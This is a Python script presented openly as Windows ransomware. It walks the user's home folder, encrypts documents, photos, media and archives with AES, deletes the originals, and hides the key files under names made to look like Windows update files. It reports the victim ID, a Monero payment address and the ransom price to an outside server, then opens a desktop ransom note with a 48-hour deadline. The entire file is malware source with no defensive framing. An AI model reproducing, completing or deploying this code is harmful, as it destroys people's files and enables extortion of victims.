#!/usr/bin/env python3
"""
Advanced Windows Ransomware Client
- Encrypts user files
- Generates child XMR address
- Registers with PythonAnywhere server
- Displays professional ransom note
"""

import os
import sys
import base64
import random
import time
import threading
import uuid
import requests
import webbrowser
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# --- Configuration --
MASTER_XMR_ADDRESS = "49JZmsP3atoU4mgh7ndf7WL8saXvBinhXD71YPmwfKLoHud9K2jvhnj7Re2zXw33t7TFa8Lsi3k5dRUjaVYCG297GR4ELCy"
SERVER_URL = "https://shadow1234.pythonanywhere.com/"
BASE_PRICE_USD = 60
MIN_DISCOUNT_PERCENT = 21
MAX_DISCOUNT_PERCENT = 35

# Exchange Rates (Simulated)
EXCHANGE_RATES = {
    "USD": 1.0,
    "EUR": 0.861,
    "GBP": 0.785,
    "BTC": 0.000015,
    "XMR": 0.0005
}

class AdvancedRansomware:
    def __init__(self):
        self.key = None
        self.iv = None
        self.victim_id = str(uuid.uuid4())
        self.locked_count = 0
        self.final_price_usd = None
        
    def generate_keys(self):
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        
        # Save keys locally for potential debug/restore
        appdata = os.getenv('APPDATA') or os.path.expanduser("~")
        key_path = os.path.join(appdata, "windows_update.bin")
        iv_path = os.path.join(appdata, "windows_update_iv.bin")
        
        with open(key_path, "wb") as f:
            f.write(base64.b64encode(self.key))
        with open(iv_path, "wb") as f:
            f.write(base64.b64encode(self.iv))
            
        return key_path, iv_path

    def generate_child_xmr_address(self):
        # Simulate child address generation
        return f"{MASTER_XMR_ADDRESS}:{self.victim_id[:8]}"

    def calculate_price(self):
        discount = random.uniform(MIN_DISCOUNT_PERCENT, MAX_DISCOUNT_PERCENT)
        self.final_price_usd = BASE_PRICE_USD * (1 - discount / 100)
        return {
            "USD": f"${self.final_price_usd:.2f}",
            "EUR": f"€{self.final_price_usd * EXCHANGE_RATES['EUR']:.2f}",
            "GBP": f"£{self.final_price_usd * EXCHANGE_RATES['GBP']:.2f}",
            "XMR": f"{self.final_price_usd * EXCHANGE_RATES['XMR']:.6f} XMR"
        }

    def encrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
            
            encrypted_path = filepath + ".locked"
            with open(encrypted_path, 'wb') as f:
                f.write(ciphertext)
            
            os.remove(filepath)
            self.locked_count += 1
            
        except Exception as e:
            pass # Silently fail on locked/readonly files

    def find_files(self, start_path):
        files_to_lock = []
        for root, dirs, files in os.walk(start_path):
            if any(sys_dir in root.lower() for sys_dir in ["windows", "program files", "recycle.bin", "appdata\local\temp"]):
                continue
            for filename in files:
                ext = os.path.splitext(filename)[1].lower()
                if ext in [".docx", ".doc", ".xlsx", ".xls", ".pptx", ".ppt",
                           ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp4", ".avi",
                           ".pdf", ".zip", ".rar", ".7z", ".txt", ".mp3", ".wav"]:
                    files_to_lock.append(os.path.join(root, filename))
        return files_to_lock

    def notify_server(self, child_address):
        try:
            payload = {
                "victim_id": self.victim_id,
                "child_xmr_address": child_address,
                "price_usd": self.final_price_usd,
                "status": "locked",
                "timestamp": time.time()
            }
            requests.post(SERVER_URL + "register", json=payload, timeout=5)
        except Exception:
            pass

    def display_ransom_note(self, prices):
        ransom_note = f"""
<!DOCTYPE html>
<html>
<head>
<style>
body {{ font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 20px; }}
.container {{ max-width: 600px; margin: 0 auto; background: #2d2d2d; padding: 20px; border-radius: 10px; box-shadow: 0 0 20px rgba(255,0,0,0.5); }}
h1 {{ color: #ff4444; }}
.price {{ font-size: 24px; color: #4CAF50; font-weight: bold; margin: 20px 0; }}
.info {{ text-align: left; margin: 20px 0; }}
.timer {{ font-size: 20px; color: #ff9800; }}
</style>
</head>
<body>
<div class="container">
    <h1>YOUR FILES ARE ENCRYPTED</h1>
    <p>Your data has been encrypted with military-grade AES-256.</p>
    <div class="price">PAYMENT: {prices['XMR']} XMR<br>({prices['USD']} USD)</div>
    <div class="info">
        <p><strong>Victim ID:</strong> {self.victim_id}</p>
        <p><strong>Address:</strong> {self.generate_child_xmr_address()}</p>
    </div>
    <div class="timer">TIME REMAINING: 48 HOURS</div>
    <p>Send payment and run the Decryption Tool to restore your files.</p>
</div>
</body>
</html>
"""
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "READ_ME.html")
        with open(desktop_path, "w") as f:
            f.write(ransom_note)
        webbrowser.open(f"file://{desktop_path}")

    def run(self):
        print("[*] Initializing...")
        self.generate_keys()
        prices = self.calculate_price()
        child_address = self.generate_child_xmr_address()
        
        print(f"[+] Price: {prices['USD']} ({prices['XMR']})")
        print(f"[+] Child Address: {child_address}")
        
        files = self.find_files(os.path.expanduser("~"))
        print(f"[+] Found {len(files)} files.")
        
        for f in files:
            self.encrypt_file(f)
            time.sleep(0.01)
            
        self.notify_server(child_address)
        self.display_ransom_note(prices)
        print(f"[+] Locked {self.locked_count} files.")

if __name__ == "__main__":
    AdvancedRansomware().run()
